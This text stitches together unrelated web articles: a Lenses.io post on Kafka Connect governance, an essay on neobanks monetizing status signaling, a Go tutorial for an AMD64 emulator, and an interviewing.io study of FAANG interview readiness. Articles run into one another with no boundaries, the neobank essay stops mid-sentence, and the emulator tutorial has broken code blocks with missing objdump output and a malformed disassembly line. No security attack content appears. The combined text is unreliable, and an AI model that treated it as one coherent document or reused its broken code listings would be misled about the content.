<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>If you’re moving data in and out of Kafka, chances are you’re using Apache Kafka Connect. The strength of the Kafka community means we have a large catalog of available connectors for hundreds of different technologies, helping to accelerate the integration of Kafka with 3rd party systems. </p><h2>Adoption challenges </h2><p>As we often see in the world of open source, Kafka’s wide adoption across the community doesn’t make the technology easier to manage. In fact, it would be fair to say there are a number of challenges and design faults that we need to live to accept for the time being. </p><p>Probably the biggest challenge here is to put good governance measures in place for Kafka Connect, which does two things: </p><ol><li><p> <!-- -->Provides healthy &amp; productive data operations for a faster time-to-integrate</p></li><li><p> <!-- -->Helps you meet IT and data compliance requirements to meet audits and get your projects into production. </p></li></ol><p>The good news is you can work around many of these challenges and provide Kafka as a Service within your organization using DataOps practices. Here we break down some of the biggest areas of compliance you may need to meet these best practices including:</p><ul><li><p> <!-- -->Confidentiality</p></li><li><p> <!-- -->Availability</p></li><li><p> <!-- -->Authorization</p></li><li><p> <!-- -->Authentication</p></li><li><p> <!-- -->Isolation &amp; multi-tenancy</p></li><li><p> <!-- -->Audit Reporting </p></li><li><p> <!-- -->Real-time monitoring</p></li></ul><p>Let’s have a look.</p><h2>Connector isolation for availability</h2><p>Applying good governance to Kafka Connect will require running connectors and pipelines across isolated clusters.&nbsp; This is both to protect availability of data and confidentiality.&nbsp; </p><p>Whilst deploying one connector, you risk others within the cluster restarting and triggering a rebalance, temporarily interrupting the service. This may be particularly painful whilst collecting data from a source with no guaranteed delivery (such as a UDP port).</p><p>Certain types of connectors may also consume heavy disk/memory or compute resources. Here we run the risk of impacting the performance or availability of other connectors housed on the cluster. </p><p>Of course your security policies may also dictate the isolation of connectors across different clusters. So a best practice would be to run them in complete isolation.</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/41BWiqu1yM2U0KdBjSThR6/5f1955406b021ee9ba7f65758c4bfd20/lenses.io_kafka_connect_connector_isolation__1_.png" alt="lenses.io Apach kafka connect connector isolation "></p><h2>ACL Management for authorization</h2><p>ACL policies allow you to authorize principles (in the form of clients) to Kafka resources, including topics. They're an absolute must.</p><p>The question is how can ACLs themselves be managed and who should have the ability to operate them?</p><p>Here there is a significant gap in native Kafka.</p><p>If you're not already using something like Ranger to manage your ACLs, they can be operated and through Lenses and secured with RBAC and auditing.</p><h2>Assigning privileges with RBAC</h2><p>Service disruption can occur through a malicious or hapless user action.&nbsp; A user could interrupt a flow by compromising one connector, or leak data by deploying another connector.&nbsp; </p><p>Privileges to operate connectors should be assigned, not assumed. Kafka Connect doesn’t provide any role-based security or auditing. </p><p>You could control what connectors are deployed as part of your CI/CD workflows, but this isn’t always the best way of managing connectors since users require constant feedback loops and error handling when deploying them. </p><p>At Lenses we’ve built a security model over Kafka Connect. It’s the same model that provides data access to relevant users.</p><p>At its most basic, you can assign permissions to operate Kafka Connect.</p><p>Then, based on topic namespaces users may be entitled to perform certain actions on a topic level. The available operations extend beyond data access and assign the ability to manage connectors with the topic as the source or sink. </p><p>For example, if you are assigned to the *metrics* namespace only you can only view, create and operate connectors that source or sink on these topics.</p><p>If you were try creating a new connector consuming from <i>crm_customers</i>, the Lenses security model would identify that you are not entitled to that topic and prevent the connector from being deployed. </p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/6q7ldslrB4Cre91aPzHC5i/3c16c68c63a56b082551cb58fc2b005d/security_namespace_RBAC_kafka_connect__1_.png" alt="security namespace RBAC Apache kafka connect "></p><h2>Authentication with SSO</h2><p>Good management of identities is a security 101. </p><p>This ensures strong use (and rotation) of passwords, two-factor authentication and provides security teams with a centralized real-time monitoring of authentication event logs. </p><p>Chances are your organization has standardized on an Access Management &amp; SSO solution and requires all business applications to integrate with it.</p><p>For Lenses, the same RBAC model mentioned above can authenticate users through your SSO provider including support for Azure, OneLogin, Okta and Keycloak. </p><p>Access audits are logged and can be integrated with your real-time security investigation &amp; user behavior monitoring tools such as Splunk. </p><h2>Multi-Tenant management</h2><p>
If you’re managing multiple Connect clusters, there will be times when you should assign privileges to the clusters, not just the connectors or Kafka resources they access. </p><p>Let's say you can deploy the Elasticsearch connector for topics dev* but only on certain dev* clusters (as opposed to in production).</p><p>Neither Kafka Connect nor open source tooling support managing privileges across different Kafka Connect clusters.</p><p>With Lenses, we’ve recently extended the security model and introduced Kafka Connect namespaces. In the same framework that manages access to data and connectors now comes the ability to define how they are accessed, and what or who accesses them.</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/5wo9H1TswETcsItVZybv4J/5cdbd832eefc04c739e7ce6d6742fb63/application_permissions_for_kafka_connect.png" alt="application permissions for kafka connect"></p><h2>Secret Management</h2><p>Avoiding secrets being exposed in code &amp; configuration can be especially tricky, and unless you use a Secret Provider plugin it will expose sensitive configurations via Kafka Connect's APIs.</p><p>Lenses allows you to delegate lookup of secrets, at runtime, to external secret providers such as Hashicorp Vault, AWS Secrets Manager and <a href="https://lenses.io/blog/2020/05/securing-kafka-connect-azure-keyvault/">Azure KeyVault</a> using a plugin. These are open source, Apache 2.0 licensed. Lenses can also act as a secret provider to reduce your tech stack further.</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/4aZgjhbqIrHpFoOI8ce2F/6122889cc32f97e29f820ee3c522ace5/kafka_connect_connector_configuration.png" alt="kafka connect connector configuration"></p><h2>Confidentiality through Data Masking</h2><p>
Encrypting and anonymizing data streams is a common and complex challenge with Kafka and often businesses need to re-architect their applications to accommodate for this.&nbsp; </p><p>There are plenty of arguments for encrypting or hashing data in transit or at source, but this may be a compliance requirement you need to fulfil in any case. </p><p>There are also times when data does not need to be encrypted or anonymized on the wire but certain fields should be masked for non-privileged users (such as IT Operators, developers etc.) This is particularly true for investigation or exploration of data.</p><p><a href="https://lenses.io/blog/2020/07/data-dump-real-time-data-catalog-apache-kafka/">Data Policies</a> allow fields across datasets to be masked based on defined rules. This does so without affecting the integrity of the data streams.</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/7G4vuR8IiuQSOi1482KsCV/4b8424332d34f7dd3b65df73fc77c0d6/data_masking__1_.png" alt="Lenses.io - Data masking for Apache Kafka"></p><h2>Audit Reporting</h2><p>
Whatever controls are put in place, you should still expect and anticipate audit reports. You may be asked to report on which teams and users are processing certain datasets for example. Data catalogs provide a great way of discovering datasets that exist across an environment.</p><p>If using Lenses, the Data Catalog intelligently discovers metadata in real-time generated by your applications, making those audits much faster.</p><p>The combination of data masking and <a href="https://lenses.io/blog/2020/12/life-of-pii-data-masking-and-compliance-for-apache-kafka/">Data Policies</a> also chip in to help during audits. The same rules that mask data can also detect and list those applications processing the relevant data. </p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/3XVj5KeEz1NMrnqCOs3YWB/c2b465288b69a848515ec0eaeb0caa08/detected_flows_kafka_connect.png" alt="detected flows kafka connect"></p><p>Not forgetting a <a href="https://lenses.io/blog/2020/08/introducing-kafka-app-catalog/">Topology view</a> which helps to address data lineage and data provenance questions.&nbsp;</p><h2>Real-time security &amp; user behavior monitoring</h2><p>
Getting production sign-off for critical projects may require having real-time security monitoring in place. </p><p>You can expect security operations teams to request audit logs for user behavior monitoring which can detect abnormal activity and insider threats. </p><p>OS level audit logs from your Kafka Connect infrastructure are a big requirement to cover and there are plenty of well-documented security logging solutions for this.</p><p>For application-level audits of Kafka Connect, however, things can prove more difficult.</p><p>With Lenses, we've made sure data operations leave an audit trail. Actions such as restarting a connector or changing configuration. </p><p>Audits can then be fired off into a SIEM or User Behavior solution with native integration into Splunk, or by using a webhook for other solutions. </p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/6GtVA7QJZdcGGug7ZprCPT/f5bcfb6734d2ed1d3fed0d94e1913a03/connectors_audit_log__1_.png" alt="audit logs for Apache kafka connect connectors"></p><h2>Next steps</h2><p>Many think of governance for Kafka Connect too late. 
</p><p>Getting on the front foot will put you in the good books with security and compliance. It will also avoid an audit that puts you in the eye of a massive storm.

Explore deploying connectors through Lenses in an all-in-one Kafka &amp; Kafka Connect environment available as a <a href="https://lenses.io/box/">Docker Container</a> or as a <a href="https://portal.lenses.io/register?version=demo">Cloud sandbox</a>.

<h3>How Neobanks Should Monetize Status Signaling</h3>



<p><span>01</span> Intro</p>



<p>If you’ve been following this blog for a while, you probably know by now that one of my favorite topics to think and write about is “status signaling”.</p>



<p>Signaling explains most of our everyday actions: what clothes we wear, which universities we pick and which religion we subscribe to. Everything has a hidden signaling component with which we communicate our desired tribal affiliation.</p>



<p>In <a href="http://julian.digital/2020/03/28/signaling-as-a-service/">Signaling-as-a-Service</a>, I described the implications signaling has on the monetization of software businesses. For many traditional industries, monetizing the display of status is not a new concept. A Rolex watch, for example, is not better at telling the time than a cheap Casio watch. But a Rolex reveals something about its owners’ wealth and, thus, their status in society. It’s that status message that explains the difference in price.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/equaltime.png"></p><p>Similarly, driving a Prius says something about your views on climate change. A <em>Make America Great Again</em> cap reveals something about your political affiliations. And Nike athletic wear signals a healthy, pro-active lifestyle.</p>



<p>Software is at a crucial disadvantage compared to these physical products because of its intangibility. A fitness app also signals a healthy, pro-active lifestyle, but no one can see it because it only lives on your phone. Everyone can see your Nike gear whenever you wear it in public. Software can’t offer the same benefit. It doesn’t have a signaling distribution channel.</p>



<p>This is why there is no software equivalent of a Rolex watch or a Louis Vuitton handbag. People aren’t willing to spend money on things other people can’t see they spent money on.</p>



<p>But it doesn’t have to be that way. As software is eating the world, the lines between physical and digital products are becoming increasingly blurry. As I have pointed out in my original essay, one way for software companies to solve the signaling distribution problem is to add a physical element to their software product.</p>



<p>In this post I want to explore this idea a little bit further. Specifically, we’ll look at neobanks – and their opportunity to monetize credit card signaling.</p>



<p><span>02</span> Neobanks</p>



<p>In the last couple of years we have witnessed the birth and rise of a new startup vertical: neobanks.</p>



<p>Neobanks differ from traditional banks in two ways:</p>



<p>1) Rather than relying on a physical branch network, the entire banking experience is managed via an app</p>



<p>2) Instead of the <a href="https://www.youtube.com/watch?v=C-q4bEULG64">“how do you do, fellow kids”</a>-cringiness that ad campaigns of traditional banks usually invoke when they try to appeal to a younger audience, neobanks are actually perceived as cool. In fact, many of them feel more like lifestyle brands than banks or tech companies.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/12/1_26qGBSGmB3yaPD7nZJrFIg.gif">



<img src="https://julian.digital/wp-content/uploads/2020/12/lifestylebrand-1.png"></p><p>Interestingly though, neobanks still use one very traditional banking element: physical cards.</p>



<p>At first glance, this might seem counterintuitive. If you are building a mobile-first bank, why not offer virtual cards and let users pay with their phone? Why go through the hassle of producing and shipping physical cards?</p>



<p>The answer is – you guessed it – signaling.</p>



<p>Think about it: Paying for things (offline) is a social activity. It’s an interaction between at least you and a cashier or waiter. But ideally, in a dinner scenario for example, you are surrounded by other people you want to impress: a date, a group of friends, or work colleagues.</p>



<p>This makes the moment you take out your card to pay the bill a great opportunity to make a statement and build social capital.</p>



<p>If you look at neobanks out there today, it’s pretty obvious that signaling is in fact one of the main benefits they offer – and almost the only thing they monetize <span>(apart from interchange, of course)</span>:</p>



<ul><li>The premium subscriptions neobanks offer usually don’t win on features but solely on nicer looking cards. The <a href="https://n26.com/metal">N26</a> or <a href="https://revolut.com/metal">Revolut</a> Metal plans, for example, don’t offer any additional features that <em>really</em> justify the ~€15 / month price tag. They do include a nice looking metal card though – that’s what people pay for.</li><li>Relatedly, it seems like most of the innovation in the industry is happening in card design. The actual banking products are more or less interchangeable, what differs is whether the card comes in <a href="https://www.apple.com/apple-card/">titanium</a>, <a href="https://www.treecard.org/">wood</a>, or <a href="https://twitter.com/cashapp/status/1290694734529400832">glow-in-the-dark yellow</a>.</li><li>You may have noticed that the credit card number has moved from the front to the back of the card. This makes it easier for users to share photos of their cards on social media as an additional signaling distribution channel.</li></ul>



<p><img src="https://julian.digital/wp-content/uploads/2020/11/nocardnumber-1.png"></p><p>Neobanks are popping up like mushrooms after the rain at the moment and it’s unlikely that this trend will end any time soon. Thanks to banking-as-a-service providers, we’ll likely see a lot of non-banking-companies add banking functionalities and cards to their product offering.</p>



<p>There’s an old Twitter joke that every app evolves until it eventually becomes a chat app. The 2020 version of that joke is that every app evolves until it eventually becomes a bank.</p>



<p>When <a href="https://twitter.com/lehrjulian/status/1295024066869567488">I did some research on credit card designs</a> recently, I was surprised by the sheer amount of different neobanks already in existance. And yet, even though almost all of them offer well-designed cards, it’s shocking how similar they all are. It seems like all of them are focusing on the same target audience instead of differentiating their signaling messages.</p>



<p>Let me explain.</p>



<p><span>03</span> In-Groups, Out-Groups and Artificial Scarcity</p>



<p>In every signaling scenario there are two possible target audiences: An in-group and an out-group.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/groups.png"></p><p>The in-group is the tribe you want to join and signal your affiliation to. The out-group is everyone else – people you want to distance yourself from.</p>



<p><a href="https://www.fastcompany.com/90391587/why-we-dont-want-you-and-your-android-green-bubbles-in-our-imessage-chat">iMessage is a great illustration of this</a>: the chat bubble colors clearly indicate who belongs to the in-group (blue = iOS) and who is part of the out-group (green = Android). </p>



<p>It’s important to note that signaling in iMessage is limited to the in-group since these color codes are only visible for iOS users – Android users can’t see who in the group is using which operating system. </p>



<p>Signaling, however, grows stronger the larger the out-group is – as long as the out-group knows about the in-group. This is why luxury car manufacturers deliberately extend their advertising campaigns to people who will never be able to afford their cars: they are increasing the size of the out-group by educating people about the in-group.</p>



<p>At the same time, brands need to control the size of the in-group. The more exclusive the in-group, the higher the signaling strength and, thus, the monetization potential of a customer. </p>



<p>The easiest control mechanism for the size of the in-group is price. If you set the price high enough, few people will be able to afford the product. Ironically, this, in turn, justifies the high price.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/priceloop.png"></p><p>Alternatively, companies create artificial scarcity by setting a hard number on supply. Limited supply creates FOMO and hype which increases the size of the out-group and results in higher social status for members of the in-group. Artificial scarcity explains the price of Bitcoin, Pokémon trading cards and why people spend hours queuing in front of Supreme shops.</p>



<p>The problem with keeping the in-group small is that it also limits the number of potential customers and, thus, overall revenue potential. Companies need to walk a fine line between maximizing the number of customers while simultaneously maximizing the number of people they can (afford to) exclude.</p>



<p><span>04</span> What Neobanks Should Build</p>



<p>The problem with neobanks today is that they all focus on the same in-group. Here are the premium cards of some of the largest European challenger banks – notice any difference?</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/metalcards.png"></p><p>It seems like everyone is trying to become the Apple of Banking – including <a href="https://www.apple.com/apple-card/">Apple itself</a>. The signaling messages are all about displaying economic power.</p>



<p>But we are slowly seeing new banking apps that are focusing on different audiences. For example, there are now a <a href="https://www.tomorrow.one/">handful of</a> <a href="https://blog.gohenry.com/uk/gohenry-news/meet-our-new-biodegradable-eco-card/">“green”</a> <a href="https://www.treecard.org/">neobanks</a> that help users signal environmental altruism. </p>



<p>Or how about <a href="https://www.razer.com/razer-card">this Razer Card</a> targeted at the gamer community?</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/12/environment.png"></p><p>The question for these companies and their investors is whether the in-group is big enough to justify building an entire bank around it. Making the unit economics of a bank work requires a certain amount of users, but as we discussed earlier, the signaling strength decreases as the size of in-group increases.</p>



<p>So how do you solve this problem?<br>By introducing multiple in-groups.</p>



<p>See, the current model looks like this:</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/neogroup01.png"></p><p>(In fact, given how undifferentiated most of the offerings and cards are, there are actually multiple neobanks within the same small in-group bubble.)</p>



<p>But what if one bank would target multiple, different in-groups?</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/neogroup02.png"></p><p>For example, what if N26 had dedicated cards for soccer fans, hip-hop enthusiasts and gamers? Instead of focusing on just one signaling audience, their total addressable market would massively increase. </p>



<p>The way they would target these audiences is via brand collaborations. N26 does not have the necessary reputation in any of the above-mentioned areas to build credible signaling messages. It would not be able to build attractive in-groups on its own – but other brands could lend N26 their social capital. </p>



<p>Apple has long worked with <a href="https://www.apple.com/lae/product-red/">RED</a>, IKEA recently <a href="https://www.highsnobiety.com/p/virgil-abloh-ikea-collaboration-best-look/">teamed up with Virgil Abloh</a>, and <a href="https://www.headspace.com/partners/nike-partnerships">Nike partners with Headspace</a>. Why wouldn’t this concept work for neobanks?</p>



<p>What would <strong>N26 x Manchester United</strong> look like? <br>Or <strong>Chime x Supreme</strong>? <br>Or <strong>Revolut x 100 Thieves</strong>?</p>



<p>Because of a bigger target audience overall, individual in-groups could be kept smaller. Cards could be <a href="https://thegeneralist.substack.com/p/scarcity-as-an-api">released as limited edition drops</a> transforming them into collectibles, which would justify a higher price tag per card.</p>



<p>It’s worth noting that different signaling audiences are not mutually exclusive. We don’t just subscribe to a single in-group – our <a href="http://julian.digital/2020/09/25/is-this-real-life/">identities are prismatic</a>. This means that some users might …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <p>In this post we'll stumble toward a working emulator for a barebones C
program compiled for linux/AMD64. The approach will be slightly more
so based on observation than by following a spec; a great way
to quickly become familiar with a topic, and a bad way to guarantee
correctness.</p>
<p>The goal:</p>
<pre><code>$ cat tests/simple.c
int main() {
  return 4;
}
$ gcc tests/simple.c
$ go build -o main
$ ./main a.out &amp;&amp; echo $?
4
</code></pre>
<p>This may look ridiculously simple but when you don't know how to deal
with a binary or how instructions are encoded, it will take a few
hours to write an emulator that can generally handle this program!</p>
<p>Code for this project is <a href="https://github.com/eatonphil/go-amd64-emulator">available on Github</a>.</p>
<h3 id="background">Background</h3><p>AMD64, x86_64 or x64 are different names for AMD's widely adopted
64-bit extension to Intel's x86 instruction set (i.e. the encoding and
semantics of x86 binaries). AMD64 is a superset of x86 (introducing
64-bit registers and operations) and thus backwards compatible with
x86 programs.</p>
<p>
  A year and a half ago I first got into emulation with
  an <a href="https://notes.eatonphil.com/emulator-basics-a-stack-and-register-machine.html">AMD64
  emulator in JavaScript</a>. The JavaScript emulator interpreted the
  textual representation of AMD64 programs (e.g. <code>MOV RBP,
  RSP</code>, Intel's assembly syntax). A C program had to be compiled
  with <code>-S</code> to produce an assembly file that the JavaScript
  emulator could read (i.e. <code>gcc -S tests/simple.c</code>) This
  was a great way to get started with emulation by ignoring the
  complexity of encoded instructions and executable formats.
</p><p>If we dig into the binary file produced by gcc on Linux we learn that
it is an <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format">ELF
file</a>.</p>
<pre><code>$ gcc test/simple.c
$ file a.out
a.out: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d0b5c742b9fbcbcca4dfa9438a8437a8478a51bb, for GNU/Linux 3.2.0, not stripped
</code></pre>
<p>ELF is responsible for surrounding the actual binary-encoded program
instructions with metadata on exported and imported C identifiers and
program entrypoint. But for simple programs like this initial
emulator, we can ignore export/imports. We'll only use the ELF
metadata to find out where the instructions for our <code>main</code>
function start.</p>
<h3 id="where-is-main?">Where is main?</h3><p>If we use an ELF reader+disassembler on the binary generated by gcc
and search for <code>main</code> we can find its address.</p>
<pre><code>$ objdump -d a.out | grep -A10 '&lt;main&gt;'
0000000000401106 &lt;main&gt;:

<p>This means that the function, <code>main</code>, starts at
address <code>0x401106</code> in memory. Furthermore, this implies
that the binary must be loaded into CPU memory such that the CPU can
jump here to execute our program.</p>
<p>In truth, <code>main</code> is not this program's entrypoint. If we
run <code>objdump -x a.out</code> we can see that the ELF entrypoint
is <code>0x401020</code>.</p>
<pre><code>$ objdump -x a.out

<p>This is because the actual entrypoint gcc sets up is a function called
<code>_start</code>. The libc prelude beginning
with <code>_start</code> is responsible for initializing the libc
runtime, calling our <code>main</code> function and executing the exit
syscall with the return value of <code>main</code>.</p>
<pre><code>objdump -d a.out | grep -A10 '&lt;_start&gt;'
0000000000401020 &lt;_start&gt;:

</code></pre>
<p>But because all this libc initialization is relatively complicated
we're just going to skip the actual ELF entrypoint for now. Our
emulator will locate <code>main</code>, load the binary into memory,
jump to the start of <code>main</code>, and set the exit code of the
emulator to the result of main.</p>
<p>
  As you can see, this ELF binary has its own hard-coded view of where
  it will be in memory. What if our CPU were to run multiple process
  at once? We might give each process its own virtual memory space
  and map back to a real memory space so each process (and by
  extension, compilers) doesn't have to think about how they fit into
  memory relative to other processes.
</p><p>The last question to figure out is where to load the ELF binary into
emulator memory so that addresses in memory are where the program
expects.</p>
<p>As it turns out, there is a piece of metadata called section
headers that contain an address and a offset from the start of the ELF
file. By subtracting this we can get the location the file expects to
be in memory.</p>
<pre><code>$ objdump -x a.out
a.out:     file format elf64-x86-64
a.out
architecture: i386:x86-64, flags 0x00000112:
EXEC_P, HAS_SYMS, D_PAGED
start address 0x0000000000401020

Program Header:
    PHDR off    0x0000000000000040 vaddr 0x0000000000400040 paddr 0x0000000000400040 align 2**3
             filesz 0x00000000000002d8 memsz 0x00000000000002d8 flags r--
</code></pre>
<p>That is: <code>0x400040 (vaddr) - 0x40 (off) = 0x400000</code>.
Judging from a Google search this seems to be a pretty common address
where ELF binaries are loaded into memory.</p>
<h3 id="elf-and-go">ELF and Go</h3><p>Binary file formats tend to be a pain to work with because, to enable
greater compression, everything ends up being a pointer to something
else. So you end up jumping all around the file just to stitch
information back together.</p>
<p>So the one third-party-ish library we'll use is Go's builtin
<code>debug/elf</code> package. With this library we can load an ELF
binary and iterate over symbols and sections to discover the location
of <code>main</code> and the start address for the binary in memory.</p>
<p>Editing in <code>main.go</code>:</p>
<pre><code>package main

import (
    "bytes"
    "debug/elf"
    "fmt"
    "io/ioutil"
    "log"
    "os"
)

type process struct {
    startAddress uint64
    entryPoint   uint64
    bin          []byte
}

func readELF(filename, entrySymbol string) (*process, error) {
    bin, err := ioutil.ReadFile(filename)
    if err != nil {
        return nil, err
    }

    elffile, err := elf.NewFile(bytes.NewReader(bin))
    if err != nil {
        return nil, err
    }

    symbols, err := elffile.Symbols()
    if err != nil {
        return nil, err
    }

    var entryPoint uint64
    for _, sym := range symbols {
        if sym.Name == entrySymbol &amp;&amp; elf.STT_FUNC == elf.ST_TYPE(sym.Info) &amp;&amp; elf.STB_GLOBAL == elf.ST_BIND(sym.Info) {
            entryPoint = sym.Value
        }
    }

    if entryPoint == 0 {
        return nil, fmt.Errorf("Could not find entrypoint symbol: %s", entrySymbol)
    }

    var startAddress uint64
    for _, sec := range elffile.Sections {
        if sec.Type != elf.SHT_NULL {
            startAddress = sec.Addr - sec.Offset
            break
        }
    }

    if startAddress == 0 {
        return nil, fmt.Errorf("Could not determine start address")
    }

    return &amp;process{
        startAddress: startAddress,
        entryPoint:   entryPoint,
        bin:          bin,
    }, nil
}

func main() {
    if len(os.Args) &lt; 2 {
        log.Fatal("Binary not provided")
    }

    proc, err := readELF(os.Args[1], "main")
    if err != nil {
        panic(err)
    }

    fmt.Printf("Start: 0x%x\nEntry: 0x%x\n", proc.startAddress, proc.entryPoint)
}
</code></pre>
<p>We can test on a basic compiled C program:</p>
<pre><code>$ cat tests/simple.c
int main() {
  return 4;
}
$ gcc tests/simple.c
$ go build -o main
$ ./main a.out
Start: 0x400000
Entry: 0x401106
</code></pre>
<p>And verify against <code>objdump</code>:</p>
<pre><code>$ objdump -d a.out | grep -A10 '&lt;main&gt;'
0000000000401106 &lt;main&gt;:
  401106:       55                      push   %rbp'&gt;'
</code></pre>
<p>And that's it for dealing with ELF. Now we can sketch out a virtual
CPU and how we deal with interpreting instructions starting at this
address.</p>
<h3 id="the-cpu">The CPU</h3><p>AMD64 counts on being able to store values in registers and memory,
sometimes through direct addressing and sometimes indirectly using
stack operations (push and pop). And userland processes count on being
loaded into CPU memory so the CPU can jump to the process entrypoint
and process.</p>
<pre><code>type cpu struct {
    proc    *process
    mem     []byte
    regfile *registerFile
    tick    chan bool
}

func newCPU(memory uint64) cpu {
    return cpu{
        mem:     make([]byte, memory),
        regfile: &amp;registerFile{},
        tick:    make(chan bool, 1),
    }
}
</code></pre>
<p>The <code>tick</code> channel is so that later on we can wrap the
emulator in a terminal debugger. But by default we'll just set up a
goroutine to tick forever.</p>
<pre><code>func repl(c *cpu) {
  // TODO
}

func main() {
    if len(os.Args) &lt; 2 {
        log.Fatal("Binary not provided")
    }

    proc, err := readELF(os.Args[1], "main")
    if err != nil {
        panic(err)
    }

    debug := false
    for _, arg := range os.Args[1:] {
        switch arg {
        case "--debug":
            fallthrough
        case "-d":
            debug = true
        }
    }

    // 10 MB
    cpu := newCPU(0x400000 * 10)

    go cpu.run(proc)
    if debug {
        repl(&amp;cpu)
    } else {
        for {
            cpu.tick &lt;- true
        }
    }
}
</code></pre>
<h3 id="registers">Registers</h3><p>To emulate a simple program like our <code>tests/simple.c</code>,
we'll only need to support a few common registers. The order is
important so that we can use the Go identifiers when we want to refer
to the <a href="https://wiki.osdev.org/X86-64_Instruction_Encoding#Registers">encoded integer value of the
register</a>.</p>

<p>Recently, someone asked us how you know you’re ready to succeed in a Facebook/Amazon/Apple/Netflix/Google (FAANG) interview.</p>



<figure><img loading="lazy" width="359" height="180" src="https://blog.interviewing.io/wp-content/uploads/2020/11/2020-11-30-faang-question-c.png" alt="" srcset="https://blog.interviewing.io/wp-content/uploads/2020/11/2020-11-30-faang-question-c.png 359w, https://blog.interviewing.io/wp-content/uploads/2020/11/2020-11-30-faang-question-c-300x150.png 300w, https://blog.interviewing.io/wp-content/uploads/2020/11/2020-11-30-faang-question-c-200x100.png 200w, https://blog.interviewing.io/wp-content/uploads/2020/11/2020-11-30-faang-question-c-50x25.png 50w" sizes="(max-width: 359px) 100vw, 359px"></figure>



<p>It’s an interesting question, and one I’m sure many of you job seekers out there are wondering.</p>



<p>Internally, we have our own beliefs, but we wanted to see if we could answer this question more objectively. So we set off on a journey to acquire data to try answering it.</p>



<span>Methodology</span>



<p>interviewing.io helps prospective job candidates practice mock interviews with actual interviewers from the major tech companies like the aforementioned FAANG companies, as well as others like Dropbox, Uber, LinkedIn, and Slack. </p>



<p>After each mock interview, candidates are measured on a 1-4 scale against three criteria (technical ability, problem solving, and communication) and are also given an overall hire/no hire rating.</p>



<figure><img loading="lazy" width="699" height="618" src="https://blog.interviewing.io/wp-content/uploads/2017/11/Screenshot-2017-11-29-09.13.30.png" alt="" srcset="https://blog.interviewing.io/wp-content/uploads/2017/11/Screenshot-2017-11-29-09.13.30.png 699w, https://blog.interviewing.io/wp-content/uploads/2017/11/Screenshot-2017-11-29-09.13.30-200x177.png 200w, https://blog.interviewing.io/wp-content/uploads/2017/11/Screenshot-2017-11-29-09.13.30-300x265.png 300w, https://blog.interviewing.io/wp-content/uploads/2017/11/Screenshot-2017-11-29-09.13.30-680x601.png 680w, https://blog.interviewing.io/wp-content/uploads/2017/11/Screenshot-2017-11-29-09.13.30-400x354.png 400w, https://blog.interviewing.io/wp-content/uploads/2017/11/Screenshot-2017-11-29-09.13.30-50x44.png 50w" sizes="(max-width: 699px) 100vw, 699px"><figcaption>Feedback form filled out by interviewers after an interviewing.io mock interview</figcaption></figure>



<p>In our analysis, we used these scores to estimate a candidate’s overall skill level, which we would expect to be positively associated with “readiness”.</p>



<p>Additionally, we needed to know whether a job candidate’s skill level and preparation ultimately resulted in the candidate getting the job. Since most real world interviews happen outside of interviewing.io, we surveyed our users to learn how far through the hiring funnel they progressed at three popular tech companies: Google, Facebook, and Amazon. For each of these companies, at least 150 respondents reported participating in the company’s hiring processes. These were the hiring stages we asked for in the survey:</p>



<ul><li>Applied</li><li>Recruiter call</li><li>Technical phone interview</li><li>Take-home assignment</li><li>Onsite</li><li>Offer</li><li>Hire</li></ul>



<p>We also needed to consider variables that could affect a person’s chance of progressing through the hiring funnel, but weren’t necessarily related to “readiness”. In addition to the mock interview feedback ratings mentioned above, we grabbed the following data about users that we collect at interviewing.io:</p>



<ul><li>How many mock interviews completed on interviewing.io</li><li>Self-reported career experience level (e.g. junior, intermediate, experienced)</li></ul>



<p>Finally, we asked survey respondents to share data that our platform doesn’t collect but could be associated with a higher chance of landing a job. Here were those other attributes:</p>



<ul><li>Gender</li><li>Possessed a computer science degree?</li><li>How many real tech interviews they’ve attended as interviewee (excludes mock interviews)</li><li>How the person learned to code</li><li>How long ago did they last go through a job search</li></ul>







<span>Relationship of respondents’ technical scores to interview success</span>



<p>Intuitively, you would think that better technical ability would be associated with a higher chance of succeeding at interviews. To see if this intuition holds true, let’s look at the frequency of people passing a phone interview, bucketed by a person’s average technical rating on interviewing.io, and see if a positive correlation exists.</p>



<p>Based on 158 respondents who reported to have progressed at least as far as Google’s phone interview phase, we observed a positive-looking relationship, but maybe not as obvious a relationship as one might expect.</p>



<figure><img src="https://lh3.googleusercontent.com/0Yx8qkjGSgv0uyzS1qHTKXEiqFYHhl2mjkqqrdgFdGltXAKMuIHQ1yVVEQNg6Lof8fT9eETUhG2s71ixmGfwtBCfLr9hn8T6mUsBfKWZfnLCoYpMZoYC6ZIDFAT7m_Zot4_cA6Y" alt=""></figure>



<p>Looking at respondents who went through the Facebook and Amazon hiring processes, the relationship seemed even less obvious:</p>



<figure><img src="https://lh5.googleusercontent.com/CHx1zzmQtTUY9TfE0Y5gZpwK_atcjgFGNDkyb_lWkFycAAIkkNQP-rGh4bgOiSzurtStX8HWrH61BBuWWkJh53R06oCgnM2VV5PeaRpLGZNXDl23WkZHbQTPsInHZ1cu8-sz1sQ" alt=""></figure>



<figure><img src="https://lh4.googleusercontent.com/zIUpkgse1iOZmmSCUsxNZgWeAC124-d0sZlmFkl6Mkj4XiAOd_vFU_1GxA-34e-Td8VDD8MRpY0PE6bxb9bZvBl2pi74NXk4yNGzO7Mzg4jkm_75hMNheduI5G-KIwYWbGutGVk" alt=""></figure>



